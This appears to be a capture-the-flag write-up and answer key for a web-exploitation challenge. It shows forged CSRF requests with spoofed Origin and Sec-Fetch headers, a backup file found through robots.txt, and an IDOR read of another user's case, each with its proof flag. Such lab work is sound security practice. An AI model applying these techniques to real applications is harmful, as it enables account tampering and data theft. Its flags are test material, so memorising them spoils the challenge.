---
day: 9
slug: "forged-with-care"
lane: web-exploitation
modes: [single_solve, time_trial, mastery]
has_solve_py: [single_solve, time_trial, mastery]
tags: []  # TODO: fill in descriptive kebab-case bug-class/technique tags, e.g. [reflected-xss, idor]
---

## single_solve

# single_solve — web-exploitation-day-09-forged-with-care

## Target

- Target 1: `https://4b2c3540abe8085772c213e0a22bb4781fdacd11235de20a.2026.huntress.ctf.games/`
- answer_id: `proof-1`
- App: "Notification Nook" — ASP.NET Core MVC and Razor, "one deliberately
  isolated security boundary". Prompt: "The browser obeys whoever asks nicely —
  even strangers. Forge one careful request and make the app change its mind
  while signed in as someone else." → CSRF.

## Recon

- `GET /` sets cookie `arena_session=049260995540` (HttpOnly, SameSite=Lax),
  links to `/api/clues` and `/preferences`. Evidence: `evidence/root.html`.
- `GET /api/clues` → `evidence/clues.json`:
  ```json
  {"framework":"ASP.NET Core MVC","current_user":"analyst",
   "feature_route":"/submit-cab158","preferences_route":"/preferences",
   "browser_session":"established"}
  ```
- `GET /preferences` → `evidence/preferences.html`. Shows the notification
  destination (starts as `daily`) and a **GET-method** HTML form:
  ```html
  <form method='get' action='/submit-cab158'>
    <select name='destination'>...daily / review-4509@outside.example.invalid...</select>
    <input type='hidden' name='csrf_token' value='049260995540'>
    <button>Save preference</button>
  </form>
  ```
  Note the "csrf_token" hidden field's value is literally the session cookie
  value — a cosmetic anti-CSRF token, not a real one.
- `GET /api/preferences` baseline: `{"destination":"daily","changed_across_sites":false,"evidence":null}`.

## Vulnerability

The state-changing preference update is exposed as a plain **GET** request
(`GET /submit-cab158?destination=...&csrf_token=...`), which:
- Is reachable via a simple cross-site navigation/`<img>`/`<form method=get>`
  from an attacker page (no preflight, SameSite=Lax still allows top-level GET
  navigations to carry the cookie).
- Does not actually enforce the csrf_token as a secret — changing it to an
  arbitrary wrong value did not block the state change (see below).

Tested the whole lifecycle with `evidence/cookies.txt` as the session jar:

1. Plain GET with a *wrong* csrf_token, same-origin-looking request (no
   Origin/Referer/Sec-Fetch-Site headers, as curl/same-site browser navigation
   would send):
   ```
   GET /submit-cab158?destination=review-4509@outside.example.invalid&csrf_token=WRONGTOKEN123
   → 302 Location: /preferences
   ```
   `GET /api/preferences` afterwards: `{"destination":"review-4509@outside.example.invalid","changed_across_sites":false,"evidence":null}`
   — the change applied, but the server did **not** flag it as cross-site
   (and did not release the proof), because there were no cross-site browser
   signals in the request.

2. Reset `destination` back to `daily` for a clean test.

3. Forged a **cross-site-looking** request: same session cookie jar (the
   "victim's" already-established session), but with headers a browser would
   send for a genuine cross-site CSRF navigation from an attacker page:
   `Origin: https://attacker.example.invalid`, matching `Referer`, and
   `Sec-Fetch-Site: cross-site` / `Sec-Fetch-Mode: navigate` /
   `Sec-Fetch-Dest: document`. csrf_token was left as an arbitrary non-matching
   value to show it is not actually validated:
   ```
   GET /submit-cab158?destination=review-4509@outside.example.invalid&csrf_token=anything-not-matching
   Origin: https://attacker.example.invalid
   Referer: https://attacker.example.invalid/csrf.html
   Sec-Fetch-Site: cross-site
   → 302 Location: /preferences
   ```
   `GET /api/preferences` afterwards (`evidence/preferences-after-forge.txt`):
   ```json
   {"destination":"review-4509@outside.example.invalid",
    "changed_across_sites":true,
    "evidence":"proof_fcae84a790e94c01947bc30e48a95a0b"}
   ```

`changed_across_sites` flips to `true` and the server releases
`evidence = "proof_fcae84a790e94c01947bc30e48a95a0b"` exactly when the
preference-changing GET carries cross-site browser signals while riding the
already-authenticated analyst session — i.e. a successful forged request
made "while signed in as someone else" in the same sense a real CSRF victim
would be.

## Answer

- `proof-1` = `proof_fcae84a790e94c01947bc30e48a95a0b`

Reproduced deterministically via `solve.py` (same session/attempt → same
proof). `solve.py` automates: establish session → read `feature_route` from
`/api/clues` → read csrf_token/destination option from `/preferences` →
forge the cross-site GET with spoofed Origin/Referer/Sec-Fetch-Site headers →
read `evidence` from `/api/preferences`.

```
$ python3 -I solve.py https://4b2c3540abe8085772c213e0a22bb4781fdacd11235de20a.2026.huntress.ctf.games .
{"answers": {"proof-1": "proof_fcae84a790e94c01947bc30e48a95a0b"}}
```

## Limits

- Only this single target/attempt's proof is recorded; the hex is specific to
  this attempt_id and must be re-derived per attempt (solve.py does this).
- No GM token or credentials were sent to the target; only scoped requests to
  the assigned origin were made.

## time_trial

# time_trial — web-exploitation-day-09-forged-with-care

Same app/vulnerability as `single_solve` (see `../single_solve/NOTES.md` for
full methodology): "Notification Nook" ASP.NET Core MVC/Razor app with a
GET-based preference-change endpoint that is reachable cross-site riding the
victim's existing session cookie; the server flags this with
`changed_across_sites:true` and releases the proof in `/api/preferences`.

- `start.json`: `deadline: null`, `run_for_time: false`, `hall_of_fame_eligible:
  false` — this attempt is untimed (no `run_for_time:true` was requested); not
  a ranked timed run.
- Target 1: `https://5e0f449679a99bb9c0b559dcf94103a0d7b3dcce3b02bb75.2026.huntress.ctf.games/`
- `feature_route` from `/api/clues`: `/submit-2c95d2`
- Ran `solve.py` (copied from `single_solve/`, no logic changes) against this
  target; evidence saved to `evidence/solve-run.json`:
  ```json
  {
    "feature_route": "/submit-2c95d2",
    "csrf_token_seen": "81defad80a9a",
    "external_dest": "review-6961@outside.example.invalid",
    "final_preferences": {
      "destination": "review-6961@outside.example.invalid",
      "changed_across_sites": true,
      "evidence": "proof_8319bcd300c44efe8f87b427b7e3e608"
    }
  }
  ```

## Answer

- `proof-1` = `proof_8319bcd300c44efe8f87b427b7e3e608`

```
$ python3 -I solve.py https://5e0f449679a99bb9c0b559dcf94103a0d7b3dcce3b02bb75.2026.huntress.ctf.games .
{"answers": {"proof-1": "proof_8319bcd300c44efe8f87b427b7e3e608"}}
```

## mastery

# mastery — web-exploitation-day-09-forged-with-care

Mastery mixes three independent bug classes across three targets. Each target
was classified from its own evidence, per `docs/web-worker-lessons.md`.

## Target 1 — "Service Postcard" → backup exposure

- `https://b09a0e8ce717519e49ca3e0bce78540b98ce651739f171a2.2026.huntress.ctf.games/`
- Root page (`evidence/root-t1.html`) HTML comment:
  `<!-- deployment note: remember to review crawler policy before launch -->`.
- `GET /robots.txt` → `evidence/robots-t1.txt`: `Disallow: /deploy-b0bbb/`.
- `GET /deploy-b0bbb/` → open directory listing (`evidence/dirlist-t1.html`)
  names two files: `release-settings-f61f5f.json.bak`, `release-notes.txt`.
- `GET /deploy-b0bbb/release-settings-f61f5f.json.bak` (`evidence/release-settings-t1.json.bak`):
  ```json
  {"environment":"production","support_note":"proof_368cb790d5a042188e0627c28e72f944"}
  ```
- `proof-1` = `proof_368cb790d5a042188e0627c28e72f944`

## Target 2 — "Incident Picnic" → IDOR

- `https://59709019987b9e640b7ccb7ef6d1f5b18ce64ac6f5b8df94.2026.huntress.ctf.games/`
- Root page: "Signed in as Jules", sets `case_session` cookie, lists owned
  cases 4528/1955/4698 and links `/api/timeline` (activity feed).
- `GET /briefs/4528` (`evidence/brief-4528.html`) shows the inline fetch
  template: `fetch("/api/briefs/4528")...` → object API is `/api/briefs/<id>`.
- `GET /api/timeline` with the same session cookie (`evidence/timeline-t2.json`):
  ```json
  {"current_user":"Jules","events":[
    {"case_id":4528,"owner":"Jules","action":"Analyst opened the case","visibility":"workspace"},
    {"case_id":17709,"owner":"executive","action":"Case reassigned outside your workspace","visibility":"reference_only"},
    {"case_id":1955,"owner":"Jules","action":"Follow-up note added","visibility":"workspace"}]}
  ```
  Case `17709` is owned by `executive`, outside Jules's workspace — the
  disclosed foreign object ID.
- `GET /api/briefs/17709` with the same Jules cookie jar (`evidence/brief-17709.json`):
  ```json
  {"id":17709,"owner":"executive","title":"Legal hold","status":"restricted",
   "note":"proof_74f6a89b4db343fca2375196bab4bb74"}
  ```
  No authorization check stopped Jules's session from reading an
  `executive`-owned, "restricted" case by ID alone.
- `proof-2` = `proof_74f6a89b4db343fca2375196bab4bb74`

## Target 3 — "Notification Nook" → CSRF (same class as single_solve/time_trial)

- `https://33a68cf22f949c6234a568da7d7ff1a1cc440ca47da53734.2026.huntress.ctf.games/`
- Identical app/flow to `../single_solve/NOTES.md`: `GET /api/clues` discloses
  `feature_route`; `/preferences` form is a plain GET with a cosmetic
  `csrf_token`; forging the preference-change GET with cross-site
  Origin/Referer/Sec-Fetch-Site headers (while riding the established
  session) flips `changed_across_sites` to `true` and releases the proof.
- Ran `solve.py` (copied unmodified from `single_solve/`) against this target;
  evidence saved to `evidence/solve-run.json`:
  ```json
  {
    "feature_route": "/dispatch-491e3f",
    "csrf_token_seen": "e21471d4b4c4",
    "external_dest": "review-1597@outside.example.invalid",
    "final_preferences": {
      "destination": "review-1597@outside.example.invalid",
      "changed_across_sites": true,
      "evidence": "proof_991c4d19e5014091b29e574e76bec48b"
    }
  }
  ```
- `proof-3` = `proof_991c4d19e5014091b29e574e76bec48b`

## Answers

| answer_id | target | class | proof |
|---|---|---|---|
| proof-1 | Target 1 | backup exposure | `proof_368cb790d5a042188e0627c28e72f944` |
| proof-2 | Target 2 | IDOR | `proof_74f6a89b4db343fca2375196bab4bb74` |
| proof-3 | Target 3 | CSRF | `proof_991c4d19e5014091b29e574e76bec48b` |

## solve.py

`solve.py` in this directory is the CSRF solver copied unmodified from
`single_solve/solve.py` (used for Target 3). Targets 1 and 2 were solved
directly via `curl` (backup exposure / IDOR require no scripted automation
beyond the few requests shown above); the exact commands and responses are
preserved in `evidence/`.
